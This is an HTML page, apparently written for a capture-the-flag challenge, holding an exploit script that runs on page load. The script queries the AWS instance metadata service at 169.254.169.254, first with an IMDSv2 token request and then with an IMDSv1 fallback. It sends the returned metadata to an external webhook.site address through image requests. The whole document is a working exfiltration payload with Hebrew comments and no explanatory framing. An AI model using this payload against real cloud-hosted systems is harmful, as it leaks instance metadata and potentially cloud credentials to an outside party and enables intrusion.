<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>IMDS CTF Exploit</title>
</head>
<body>
  <h1>Running IMDS Exploit...</h1>
  <script>
    (async () => {
      const webhookURL = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d';

      // מנסה לקבל טוקן IMDSv2
      let tokenRes;
      try {
        tokenRes = await fetch('http://169.254.169.254/latest/api/token', {
          method: 'PUT',
          headers: {
            'X-aws-ec2-metadata-token-ttl-seconds': '21600',
          },
        });
      } catch(e) {
        tokenRes = null;
      }

      if (!tokenRes || !tokenRes.ok) {
        // לא הצליח לקבל טוקן - מנסה IMDSv1 (ללא טוקן)
        try {
          const data = await fetch('http://169.254.169.254/latest/meta-data/').then(r => r.text());
          new Image().src = webhookURL + '?flag=' + encodeURIComponent(data);
        } catch(e) {
          new Image().src = webhookURL + '?error=No metadata access (IMDSv1 failed)';
        }
        return;
      }

      const token = await tokenRes.text();

      // מנסה לקבל מידע עם הטוקן
      try {
        const metadata = await fetch('http://169.254.169.254/latest/meta-data/', {
          headers: { 'X-aws-ec2-metadata-token': token },
        }).then(r => r.text());

        new Image().src = webhookURL + '?flag=' + encodeURIComponent(metadata);
      } catch(e) {
        new Image().src = webhookURL + '?error=Failed to get metadata with token';
      }
    })();
  </script>
</body>
</html>
